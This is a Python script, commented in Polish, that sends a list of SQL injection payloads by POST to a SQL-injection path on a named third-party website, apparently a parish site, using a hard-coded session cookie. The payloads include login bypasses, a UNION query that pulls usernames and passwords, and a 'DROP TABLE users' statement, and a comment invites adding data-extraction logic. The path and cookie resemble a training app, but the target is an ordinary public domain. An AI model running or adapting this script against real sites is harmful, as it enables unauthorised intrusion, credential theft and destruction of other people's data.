import requests

base_url = "http://www.grybow.parafia.info.pl/"

payloads = [
    "' or 1=1#",
    "' OR '1'='1",
    "' OR 1=1 -- ",
    "\" OR 1=1#",
    "\" OR \"1\"=\"1",
    "\" OR 1=1 -- ",
    "') OR ('x'='x",
    "'; DROP TABLE users--",
    "' OR EXISTS(SELECT * FROM users WHERE name = 'admin' AND password LIKE '%')",
    "' UNION SELECT user, password FROM users#"

]

cookies = {
    'PHPSESSID': 'oum0iaoe530vblhijrh5gp3md7',
    'security': 'low'
}

def test_sql_injection(url):
    for payload in payloads:
        # Użyj metody POST i przekaż payload jako część ciała żądania
        full_url = f"{url}/vulnerabilities/sqli/"
        data = {'p': payload}  # Dane formularza

        print(f"Testing with payload: {payload}")

        try:
            response = requests.post(full_url, data=data, cookies=cookies)
            print(f"Response status code: {response.status_code}")

            if response.status_code == 200:
                print(f"Response text:\n{response.text}\n")

                # Sprawdź, czy odpowiedź zawiera dane oznaczające wykrycie podatności
                if "First name" in response.text and "Surname" in response.text:
                    print(f"Podatność SQL Injection wykryta przy użyciu payloadu: {payload}")
                    # Możesz dodać więcej logiki, aby wyciągnąć konkretne dane użytkownika, jeśli to potrzebne
            else:
                print(f"Nieoczekiwany kod statusu: {response.status_code}")

        except requests.exceptions.RequestException as e:
            print(f"Request Exception: {e}")

        print("---------------------------------------------------")

# Przetestowanie strony
test_sql_injection(base_url)

